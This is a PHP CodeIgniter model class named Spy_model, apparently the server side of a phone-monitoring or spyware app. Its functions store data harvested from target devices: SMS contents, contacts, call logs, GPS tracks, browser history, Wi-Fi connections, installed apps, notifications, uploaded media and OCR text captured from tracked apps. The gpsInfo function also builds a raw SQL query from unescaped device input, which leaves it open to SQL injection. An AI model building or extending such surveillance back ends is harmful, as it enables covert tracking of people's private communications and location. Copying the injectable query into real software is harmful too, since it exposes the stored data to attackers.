<?php
class Spy_model extends CI_Model
{

    public function __construct()
    {
        $this->load->database();
    }
     function saveDeviceStatus($input = "")
    {
      
   $gm_time = get_gmt_time();
   
 
	 $in_arr = array(
            "status" => 'ONLINE',
            "last_status_check" => $gm_time);
			
			$this->db->where('uuid',$input['uuid']);
			$qry_res= $this->db->update('device_info', $in_arr);
            
        return $qry_res;
    }
	function get_data_settings($device_id)
	{
		$this -> db -> where("uuid" ,$device_id );
		$query = $this -> db -> get('device_setting');
 
       return $query->row_array();
	}
	
	 function deviceReady($input = "")
    {
      
   $gm_time = get_gmt_time();
   
 
	 $in_arr = array(
	 "uuid"=>$input['device_id'],
            "is_ready" => '1',
            "createdon" => $gm_time);
			
		 
			$qry_res= $this->db->insert('tb_ready', $in_arr);
            $this->deleteDeviceRequest($input['device_id']);
        return $qry_res;
    }
	
	function deleteDeviceRequest($uuid)
	{
		$this->db->where("uuid",$uuid);
	 $qry_res =	$this->db->delete("data_request");
		return $qry_res;
	}
	
	function ocrTrackApps()
	{
		$this->db->where("is_track","1");
		$query = $this->db->get("ocr_apps");
		return $query->result_array();
	}
				function deviceBatteryLevel($input)
		{
						$in_arr = array("battery_level" => "LOW","battery"=>$input['battery']);

			$this -> db -> where('uuid', $input['uuid']);
			$qry_res = $this -> db -> update('device_info', $in_arr);
			if($qry_res){
			return true;
			}else{
				return false;
			}
		}
		
	 function checkDeviceRequest($input = "")
    {
      
  $this->db->where("uuid",$input['uuid']);
 $query = $this->db->get('data_request');
        if($query->num_rows()>0){
        	return true;
        }else{
        	return false;
        }    
         
    }
	
	
	
    function saveDeviceInfo($input = "")
    {
      
   $gm_time = get_gmt_time();
   
 $data =  make_serialize($input['data']);
 $this->db->where('uuid',$input['uuid']);
$check= $this->db->get('device_info');
 if($check->num_rows()>0){
 	$row =$check->row_array();
	 $in_arr = array(
            "device_detail" => $data,
            "is_delete" => '0',
            "updatedon" => $gm_time);
			
			$this->db->where('uuid',$input['uuid']);
			$qry_res= $this->db->update('device_info', $in_arr);
             $id =$row['id'];
 	
 }else{
   $in_arr = array(
            "uuid"=>$input['uuid'],
            "device_detail" => $data,
             "is_delete" => '0',
            "createdon" => $gm_time);
			
			
			$qry_res= $this->db->insert('device_info', $in_arr);
			$id = (string) $this->db->insert_id();
             
 }
 
        if ($qry_res) {
        	$this->db->where('device_id',$input['uuid']);
$this->db->delete('deleted_device');
            return $id;
        }
        return false;
    }
		
	///
	function deviceDeleted($uuid){
		$this->db->where("device_id",$uuid);
	 $query =	$this->db->get("deleted_device");
	 if($query->num_rows()>0){
	 	return "1";
	 }else{
	 	return "0";
	 }
	}
	
	////
	    function saveDeviceOther($input = "")
    {
    	$battery_level = 'OK';
      $space_available = $total_space = $battery_status ='';
   $gm_time = get_gmt_time();
   if(isset($input['space_available'])){
   $space_available =	$input['space_available'];
   }
    if(isset($input['total_space'])){
   $total_space =	$input['total_space'];
   }
	 if(isset($input['battery_status'])){
   	$battery_status = $input['battery_status'];
   }
  
 $this->db->where('uuid',$input['uuid']);
$check= $this->db->get('device_info');
 if($check->num_rows()>0){
 	$row =$check->row_array();
	 if($battery_status<20){
	 	$battery_level = 'LOW';
	 }
	 $in_arr = array(
            "space_available" => $space_available,
            "total_space" => $total_space,
           "battery_status" =>  $battery_status,
           "battery_level" =>  $battery_level,
           "battery" =>  $battery_status,
            "updatedon" => $gm_time);
			
			$this->db->where('uuid',$input['uuid']);
			$qry_res= $this->db->update('device_info', $in_arr);
         
        return     $id =$row['id'];
 	
 } 
         
        return false;
    }
	
	
	////
	function saveDeviceToken($input = "")
    {
      $qry_res = false;
   $gm_time = get_gmt_time();
   
 
 $this->db->where('uuid',$input['uuid']);
$check= $this->db->get('device_info');
 if($check->num_rows()>0){
 	$row =$check->row_array();
	 $in_arr = array(
            "device_token" => $input['device_token'],
            "updatedon" => $gm_time);
			
			$this->db->where('uuid',$input['uuid']);
			$qry_res= $this->db->update('device_info', $in_arr);
             $id =$row['id'];
 	
 } else{
   $in_arr = array(
            "uuid"=>$input['uuid'],
            "device_token" => $input['device_token'],
            "createdon" => $gm_time);
			
			
			$qry_res= $this->db->insert('device_info', $in_arr);
			$id = (string) $this->db->insert_id();
             
 }
 
        if ($qry_res) {
            return $id;
        }
        return false;
    }
	
	///
	
	    function smsInfo($input = "")
    {
      
   $gm_time = get_gmt_time();
   
 $data =  $input['data'];
 $this->db->where('device_id',$input['device_id']);
$check= $this->db->get('device_native_sms');
 if($check->num_rows()>0){
 	$row =$check->row_array();
	 $in_arr = array(
            "sms_detail" => $data,
            "updatedon" => $gm_time);
			
			$this->db->where('device_id',$input['device_id']);
			$qry_res= $this->db->update('device_native_sms', $in_arr);
             $id =$row['id'];
 	
 }else{
   $in_arr = array(
            "device_id"=>$input['device_id'],
            "sms_detail" => $data,
            "createdon" => $gm_time);
			
			
			$qry_res= $this->db->insert('device_native_sms', $in_arr);
			$id = (string) $this->db->insert_id();
             
 }
 
        if ($qry_res) {
            return true;
        }
        return false;
    }
	
	///save notification
		    function deviceNotification($input = "")
    {
      
   $gm_time = get_gmt_time();
   
 $data =  $input['data'];
 
   $in_arr = array(
            "device_id"=>$input['device_id'],
            "image"=>$input['file_name'],
            "notification_detail" => $data,
            "createdon" => $gm_time);
			
			
			$qry_res= $this->db->insert('device_notification', $in_arr);
			$id = (string) $this->db->insert_id();
             
  
 
        if ($qry_res) {
            return true;
        }
        return false;
    }
	
	//end notification
	
	
		    function contactInfo($input = "")
    {
      
   $gm_time = get_gmt_time();
   
 $data =  make_serialize($input['data']);
 $this->db->where('device_id',$input['device_id']);
$check= $this->db->get('device_contact');
 if($check->num_rows()>0){
 	$row =$check->row_array();
	 $in_arr = array(
            "contact_detail" => $data,
            "updatedon" => $gm_time);
			
			$this->db->where('device_id',$input['device_id']);
			$qry_res= $this->db->update('device_contact', $in_arr);
             $id =$row['id'];
 	
 }else{
   $in_arr = array(
            "device_id"=>$input['device_id'],
            "contact_detail" => $data,
            "createdon" => $gm_time);
			
			
			$qry_res= $this->db->insert('device_contact', $in_arr);
			$id = (string) $this->db->insert_id();
             
 }
 
        if ($qry_res) {
            return true;
        }
        return false;
    }
		    function callLog($input = "")
    {
      
   $gm_time = get_gmt_time();
   
 $data =  make_serialize($input['data']);
 $this->db->where('device_id',$input['device_id']);
$check= $this->db->get('call_log');
 if($check->num_rows()>0){
 	$row =$check->row_array();
	 $in_arr = array(
            "call_detail" => $data,
            "updatedon" => $gm_time);
			
			$this->db->where('device_id',$input['device_id']);
			$qry_res= $this->db->update('call_log', $in_arr);
             $id =$row['id'];
 	
 }else{
   $in_arr = array(
            "device_id"=>$input['device_id'],
            "call_detail" => $data,
            "createdon" => $gm_time);
			
			
			$qry_res= $this->db->insert('call_log', $in_arr);
			$id = (string) $this->db->insert_id();
             
 }
 
        if ($qry_res) {
            return true;
        }
        return false;
    }
	
     function gpsInfo($input = "")
    {
      
   $gm_time = get_gmt_time();
  $data= json_decode($input['data'],true);
  date_default_timezone_set("UTC");
     $timestamp = strtotime($data['DateTime']);
 $location_time=date('H:i', $timestamp);;
  
   $latlng="[".$data['Latitude'].",".$data['Longitude'].",".$location_time."]";

 
$check= $this->db->query("select * from device_gps where device_id='".$input['device_id']."' and 
date(createdon)= date('".$gm_time."') ");
 if($check->num_rows()>0){
 	
 	$row =$check->row_array();
	 $in_arr = array(
            "location_detail" => $row['location_detail']."|".$latlng,
            "updatedon" => $gm_time);
			$this->db->where("date(createdon)= date('".$gm_time."') ");
			$this->db->where('device_id',$input['device_id']);
			$qry_res= $this->db->update('device_gps', $in_arr);
             $id =$row['id'];
 	
 }else{
   $in_arr = array(
            "device_id"=>$input['device_id'],
            "location_detail" => $latlng,
            "createdon" => $gm_time);
			
			
			$qry_res= $this->db->insert('device_gps', $in_arr);
			$id = (string) $this->db->insert_id();
             
 }
 
        if ($qry_res) {
            return true;
        }
        return false;
    }
	
	     function browserHistoryInfo($input = "")
    {
      
   $gm_time = get_gmt_time();
   
 $data =  make_serialize($input['data']);
 $this->db->where('device_id',$input['device_id']);
$check= $this->db->get('device_browser_history');
 if($check->num_rows()>0){
 	$row =$check->row_array();
	 $in_arr = array(
            "browser_history_detail" => $data,
            "updatedon" => $gm_time);
			
			$this->db->where('device_id',$input['device_id']);
			$qry_res= $this->db->update('device_browser_history', $in_arr);
             $id =$row['id'];
 	
 }else{
   $in_arr = array(
            "device_id"=>$input['device_id'],
            "browser_history_detail" => $data,
            "createdon" => $gm_time);
			
			
			$qry_res= $this->db->insert('device_browser_history', $in_arr);
			$id = (string) $this->db->insert_id();
             
 }
 
        if ($qry_res) {
            return true;
        }
        return false;
    }
	
		
	     function wifiInfo($input = "")
    {
      
   $gm_time = get_gmt_time();
   
 $data =  make_serialize($input['data']);
 $this->db->where('device_id',$input['device_id']);
$check= $this->db->get('device_wifi_conn');
 if($check->num_rows()>0){
 	$row =$check->row_array();
	/* $in_arr = array(
            "wifi_detail" => $data,
            "updatedon" => $gm_time);
			
			$this->db->where('device_id',$input['device_id']);
			$qry_res= $this->db->update('device_wifi_conn', $in_arr);
             $id =$row['id'];
			 */
  $in_arr = array(
            "device_id"=>$input['device_id'],
            "wifi_detail" => $data,
            "createdon" => $gm_time);
			
			
			$qry_res= $this->db->insert('device_wifi_conn', $in_arr);
			$id = (string) $this->db->insert_id();
             
 	
 }else{
   $in_arr = array(
            "device_id"=>$input['device_id'],
            "wifi_detail" => $data,
            "createdon" => $gm_time);
			
			
			$qry_res= $this->db->insert('device_wifi_conn', $in_arr);
			$id = (string) $this->db->insert_id();
             
 }
 
        if ($qry_res) {
            return true;
        }
        return false;
    }

//----------------------------Error Logs-------------------------------///




	     function errorLogs($input = "")
    {
      
   $gm_time = get_gmt_time();
   
 $data =   $input['data'] ;
 
  $in_arr = array(
            "device_id"=>$input['device_id'],
            "detail" => $data,
            "createdon" => $gm_time);
			
			
			$qry_res= $this->db->insert('error_logs', $in_arr);
			$id = (string) $this->db->insert_id();
             
 	
 
 
        if ($qry_res) {
            return true;
        }
        return false;
    }




///----------------end error log-------------------------------///////////


	//---------------------Ip Info ----------------------------------//
		     function mobileIpInfo($input = "")
    {
      
   $upload_datetime = get_gmt_time();
   
    if(isset($input['upload_datetime'])){
   	$upload_datetime = $input['upload_datetime'];
   }
   
    $data = $this->getIpInfo() ;
 
   $in_arr = array(
            "device_id"=>$input['device_id'],
            "ip_detail" => $data,
            "createdon" => $upload_datetime);
			
			
			$qry_res= $this->db->insert('device_ip_info', $in_arr);
			$id = (string) $this->db->insert_id();
             
 
 
        if ($qry_res) {
            return true;
        }
        return false;
    }
	
	function getIpInfo()
	{
		 $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
       $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
$ipaddress = getenv('REMOTE_ADDR');
return $ipaddress;   
	}
	
	//---------------------End of Ip Info-----------------------//
		
	     function appInfo($input = "")
    {
      
   $gm_time = get_gmt_time();
   
 $data =  make_serialize($input['data']);
 $this->db->where('device_id',$input['device_id']);
$check= $this->db->get('device_apps');
 if($check->num_rows()>0){
 	$row =$check->row_array();
	 $in_arr = array(
            "app_detail" => $data,
            "updatedon" => $gm_time);
			
			$this->db->where('device_id',$input['device_id']);
			$qry_res= $this->db->update('device_apps', $in_arr);
             $id =$row['id'];
 	
 }else{
   $in_arr = array(
            "device_id"=>$input['device_id'],
            "app_detail" => $data,
            "createdon" => $gm_time);
			
			
			$qry_res= $this->db->insert('device_apps', $in_arr);
			$id = (string) $this->db->insert_id();
             
 }
 
        if ($qry_res) {
            return true;
        }
        return false;
    }
	
	
		     function mediaUpload($input = "")
    {
      $other = $filepath ="";
$upload_datetime = $mediatime =  $gm_time = get_gmt_time();
   if(isset($input['media_datetime'])){
   	$mediatime = $input['media_datetime'];
   }
     if(isset($input['upload_datetime'])){
   	$upload_datetime = $input['upload_datetime'];
   }
   
   if(isset($input['other'])){
   	$other = $input['other'];
   }
   
   if(isset($input['filepath'])){
   	$patharray = explode('/',  $input['filepath']);
	   if(count($patharray)>0){
	    $patharry = 	array_pop($patharray);
	   	$filepath = implode('/', $patharray);
		
		 
	   }
	
   }
 
   $in_arr = array(
            "device_id"=>$input['device_id'],
             "file_name"=>$input['file_name'],
              "file_type"=>$input['file_type'],
              "app_name"=>$input['app_name'],
               "module"=>$input['module'],
              "media_datetime"=> $mediatime,
              "upload_datetime"=> $upload_datetime,
             "filepath"=>  $filepath,
              "other"=>$other,
            "createdon" => $gm_time);
			
			
			$qry_res= $this->db->insert('media', $in_arr);
			$id = (string) $this->db->insert_id();
             
 
 
        if ($qry_res) {
            return true;
        }
        return false;
    }


		     function ocrMediaUpload($input = "")
    {
      $other = "";
 $upload_datetime =  $mediatime = $gm_time = get_gmt_time();
   if(isset($input['media_datetime'])){
   	$mediatime = $input['media_datetime'];
   }
   if(isset($input['other'])){
   	$other = $input['other'];
   }
    if(isset($input['upload_datetime'])){
   	$upload_datetime = $input['upload_datetime'];
   }
   $in_arr = array(
            "device_id"=>$input['device_id'],
             "file_name"=>$input['file_name'],
              "package_name"=>$input['package_name'],
              "app_name"=>$input['app_name'],
               "ocr_text"=>$input['ocr_text'],
              "media_datetime"=> $mediatime,
              "upload_datetime"=> $upload_datetime,
              "other"=>$other,
            "createdon" => $gm_time);
			
			
			$qry_res= $this->db->insert('ocr_media', $in_arr);
			$id = (string) $this->db->insert_id();
             
 
 
        if ($qry_res) {
            return true;
        }
        return false;
    }
	
}



?>
